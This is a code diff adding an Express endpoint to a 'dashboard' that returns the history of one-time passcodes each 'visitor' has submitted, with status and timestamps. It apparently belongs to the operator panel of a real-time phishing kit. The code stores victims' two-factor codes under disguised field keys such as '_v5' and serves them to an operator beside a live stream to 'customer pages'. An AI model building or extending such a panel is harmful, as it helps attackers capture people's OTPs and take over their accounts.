@@ -703,6 +703,54 @@ async function startServer() {
     }
   });
 
+  // =============================================
+  // Get OTP Codes History for a Visitor (excluding current)
+  // =============================================
+  app.get("/api/dashboard/otp-history/:visitorId", async (req, res) => {
+    try {
+      const { visitorId } = req.params;
+      const visitor = await readVisitor(visitorId);
+      
+      if (!visitor) {
+        res.status(404).json({ error: "Visitor not found", codes: [] });
+        return;
+      }
+
+      // Get all historical OTP codes (excluding current _v5)
+      const codes: any[] = [];
+      const currentOtp = visitor.raw?._v5 || visitor.raw?.otpCode;
+      
+      // Get historical OTP entries from rawData array (if exists)
+      const rawData = visitor.rawData || [];
+      for (const entry of rawData) {
+        const otpCode = entry?.raw?._v5 || entry?.raw?.otpCode;
+        if (otpCode) {
+          // Check if this OTP is not the current one
+          const isCurrentOtp = otpCode === currentOtp;
+          if (!isCurrentOtp) {
+            // Check if this OTP is not already in the list
+            const exists = codes.some(c => c.code === otpCode);
+            if (!exists) {
+              codes.push({
+                code: otpCode,
+                status: entry.raw._v5Status || entry.raw.otpStatus || "pending",
+                updatedAt: entry.raw._v5UpdatedAt || entry.raw.otpSubmittedAt || entry.updatedAt
+              });
+            }
+          }
+        }
+      }
+
+      // Sort by updatedAt descending
+      codes.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
+
+      res.json({ codes, visitorId });
+    } catch (error) {
+      console.error("Error fetching OTP history:", error);
+      res.status(500).json({ error: "Failed to fetch OTP history", codes: [] });
+    }
+  });
+
   // SSE endpoint for customer pages (one-way from server to customer)
   app.get("/api/dashboard/stream", (_req, res) => {
     res.setHeader("Content-Type", "text/event-stream");
